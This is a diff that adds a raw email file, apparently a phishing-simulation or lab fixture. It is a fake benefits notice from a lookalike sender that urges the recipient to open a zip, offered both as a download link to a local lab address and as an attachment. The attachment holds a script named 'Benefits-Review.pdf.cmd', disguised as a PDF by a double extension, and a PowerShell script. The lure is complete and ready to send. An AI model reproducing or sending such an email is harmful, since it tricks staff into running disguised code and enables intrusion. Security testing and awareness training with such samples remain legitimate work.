@@ -1,0 +1,38 @@
+From: Employee Benefits <benefits@people-update.example>
+Reply-To: support@benefits-review.example
+To: accounts@company.example
+Subject: Action required: benefits review
+Date: Mon, 19 Oct 2026 09:13:46 +0000
+Message-ID: <179240122600.2.7455291422176946045@people-update.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============3430587835074885773=="
+
+--===============3430587835074885773==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Please review the benefits document before the end of the day.
+Download: http://10.0.2.2:8766/phishing/Benefits-Review.zip
+The same archive is attached.
+
+--===============3430587835074885773==
+Content-Type: application/zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Benefits-Review.zip"
+MIME-Version: 1.0
+
+UEsDBBQAAAAIADM/U11GB4kAUgAAAFQAAAAXAAAAQmVuZWZpdHMtUmV2aWV3LnBkZi5jbWRzSE3O
+yFfIT0vjKsgvTy0qzkjNydFLrUhV0PXLDyjKT8vMATJdK1KTS0sy8/MC8nMykysVnCoLEouLFXTd
+QLJKqnUpBQZFqWWZqeV6BcWGSlwAUEsDBBQAAAAIADM/U10muHweiwEAAB0CAAAKAAAAcmV2aWV3
+LnBzMU2RTW/bMAyG7/4VQhHA6UFO10NXGCi2LEmHDEtqNA56aHpQZLZWE4seRaUN1v330c4O00GA
++PE+4svBjAhpbNmhLwiegcBbUDcqXTG2aTLAyN1rkm8KwhcyzdSw2SywNg1UP812U9Qu1M6/pMkS
+3vScoVH9XR5bUFNHYBnpqHRhuFa9nL5FEsaHuousl3G/Tx7bYGNgbHD7KvVPX38nSk5kK+zhd2At
+VDjPSlx7dwAKZl+6BoZdZMUk9GGK6XnfZLFpIwNJ5wD8IZ/cLYp1Obtfjhezk2rok48rsJEcH7NC
+BKxrzT57cL7CtzCvwLNknvJc2JNIYgoLbCkz9xKtqzr5Yj7tnwQh7nubxszG1o2UK3gX/c5W1Rja
+AaXJHxl5gl7+zyXqH0FSH2olw0mQu5azzp4NwcGJkyfR7FXKzpSeeYuVzKnW5e11MvcH3IF+gO09
+/IoQWKU1c5uPRp8usovsMrvMrz9fXY3af7sZGbv7Yk2Amy14eHYc9ImSKr0O8M0EZwtDoQP8t5a/
+UEsBAhQDFAAAAAgAMz9TXUYHiQBSAAAAVAAAABcAAAAAAAAAAAAAAKSBAAAAAEJlbmVmaXRzLVJl
+dmlldy5wZGYuY21kUEsBAhQDFAAAAAgAMz9TXSa4fB6LAQAAHQIAAAoAAAAAAAAAAAAAAKSBhwAA
+AHJldmlldy5wczFQSwUGAAAAAAIAAgB9AAAAOgIAAAAA
+
+--===============3430587835074885773==--
